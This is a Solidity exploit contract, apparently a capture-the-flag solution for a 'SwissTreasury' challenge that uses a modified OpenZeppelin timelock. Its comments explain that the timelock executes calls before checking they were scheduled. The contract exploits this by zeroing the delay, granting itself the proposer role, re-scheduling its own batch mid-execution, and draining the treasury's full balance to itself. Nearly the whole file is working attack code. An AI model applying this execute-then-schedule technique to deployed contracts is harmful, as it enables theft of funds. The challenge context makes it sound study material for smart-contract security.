// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import './Setup.sol';
import 'hardhat/console.sol';

// this is a very sneaky and a good one
// the openzeppelin include is modified, check it up on etherscan and replace your file accordingly
// otherwise it won't work
// the modified version doesn't check if a call has been scheduled before execution
// I would've probably failed this if there wasn't the `TheKingIsDeadLongLiveTheKing` contract :o
// I think this is my favourite

contract Exploit {
    SwissTreasury challenge;
    constructor(SwissTreasury _challenge) {
        challenge = _challenge;
    }

    function exploit() public
    {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4); // empty
        bytes[] memory datas = new bytes[](4);
        targets[0] = address(challenge);
        targets[1] = address(challenge);
        targets[2] = address(this);
        targets[3] = address(challenge);
        datas[0] = abi.encodeWithSelector(challenge.updateDelay.selector, 0);
        datas[1] = abi.encodeWithSelector(challenge.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this));
        datas[2] = abi.encodeWithSelector(this.scheduleBatch.selector);
        datas[3] = abi.encodeWithSelector(challenge.distributeFunds.selector, address(this), address(challenge).balance);
        bytes32 predecessor = "";
        bytes32 salt = "";
        
        challenge.executeBatch(targets, values, datas, predecessor, salt);
    }

    function scheduleBatch() public
    {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4); // empty
        bytes[] memory datas = new bytes[](4);
        targets[0] = address(challenge);
        targets[1] = address(challenge);
        targets[2] = address(this);
        targets[3] = address(challenge);
        datas[0] = abi.encodeWithSelector(challenge.updateDelay.selector, 0);
        datas[1] = abi.encodeWithSelector(challenge.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this));
        datas[2] = abi.encodeWithSelector(this.scheduleBatch.selector);
        datas[3] = abi.encodeWithSelector(challenge.distributeFunds.selector, address(this), address(challenge).balance);
        bytes32 predecessor = "";
        bytes32 salt = "";
        
        challenge.scheduleBatch(targets, values, datas, predecessor, salt, 0);
    }

    fallback() external payable {
    }

}